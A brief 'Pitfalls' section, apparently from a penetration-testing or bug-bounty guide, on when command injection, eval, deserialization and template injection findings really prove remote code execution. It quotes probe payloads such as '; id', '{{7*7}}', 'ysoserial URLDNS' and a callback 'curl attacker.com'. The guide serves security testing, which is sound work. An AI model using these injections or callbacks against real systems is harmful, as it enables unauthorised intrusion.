## Pitfalls
- **Command injection in non-production environment** — `; id` returning the username is not RCE unless you can escalate to arbitrary command execution.
- **eval/exec with partially controlled input** — if only part of the input reaches eval, the exploit may be harder. Document what you control.
- **OOB RCE without confirmation** — `curl attacker.com` in a blind RCE proves command execution. DNS-only callback is weaker evidence.
- **Deserialization RCE without gadget chain** — `ysoserial URLDNS` proves deserialization, not RCE. Need a Runtime.exec gadget.
- **Template injection without code execution** — `{{7*7}}` returning 49 proves SSTI. Need to escalate to actual code execution for RCE severity.

---

